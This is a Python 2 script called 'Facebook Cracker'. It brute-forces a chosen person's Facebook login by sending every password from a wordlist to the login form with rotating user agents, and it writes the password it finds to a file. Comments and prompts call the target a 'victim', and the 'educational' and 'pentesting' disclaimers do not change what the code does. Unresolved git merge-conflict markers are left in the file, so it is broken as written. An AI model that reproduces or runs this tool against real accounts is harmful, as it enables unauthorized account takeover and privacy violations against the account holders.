#!usr/bin/python
#Facebook Cracker Version 2 can crack into Facebook Database 100% without Interruption By Facebook Firewall !
#This program is for educational purposes only.
#Don't attack people facebook accounts it's illegal !
#If you want to crack into someone's account, you must have the permission of the user.



import sys
import random
import mechanize
import cookielib
<<<<<<< HEAD
=======

>>>>>>> origin/master

GHT = '''
        +=======================================+
        |..........Facebook Cracker v 3.........|
        +---------------------------------------+
        |#Author: Levensowrth                   |
        |                                       |
        |#Date: 12/02/2016                      |
        |#This tool is made for pentesting.     |
        |                                       |
        |                                       |
        |#Respect Coderz ^_^                    |
        |#I take no responsibilities for the    |
        |  use of this program !                |
        +=======================================+
        |..........Facebook Cracker v 3.........|
        +---------------------------------------+
'''
print "Note: - This tool can crack facebook account even if you don't have the email of your victim"
print "# Hit CTRL+C to quit the program"
print "# Use www.graph.facebook.com for more infos about your victim ^_^"


email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
passwordlist = str(raw_input("Enter the name of the password list file : "))

useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                ('User-agent','Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36'),
                ('User-agent','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9')]



login = 'https://www.facebook.com/login.php?login_attempt=1'
def attack(password):

  try:
     sys.stdout.write("\r[*] trying %s.. " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)


     ##Facebook
     br.form['email'] =email
     br.form['pass'] = password
     rep = br.submit()
     log = br.geturl()
<<<<<<< HEAD
     toCheck = login in log
=======
     toCheck = login  in log
>>>>>>> origin/master
     if (not toCheck):
        print "\n\n\n [*] Password found .. !!"
        print "\n [*] Password : %s\n" % (password)
        pwd = open("result.txt", "w")
        pwd.write(password)
        pwd.close
        end  = 1
        sys.exit(1)
  except KeyboardInterrupt:
        print "\n[*] Exiting program .. "
        sys.exit(1)

  except :
        if end == 1:
            sys.exit(1)
        else:
            pass

def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))



def check():

    global br
    global passwords
    global end
    end = 0
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\n[*] Exiting program ..\n"
       sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print "\n [*] Error: check your password list path \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        print GHT
        print " [*] Account to crack : %s" % (email)
        print " [*] Loaded :" , len(passwords), "passwords"
        print " [*] Cracking, please wait ..."
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)

if __name__ == '__main__':
    check()
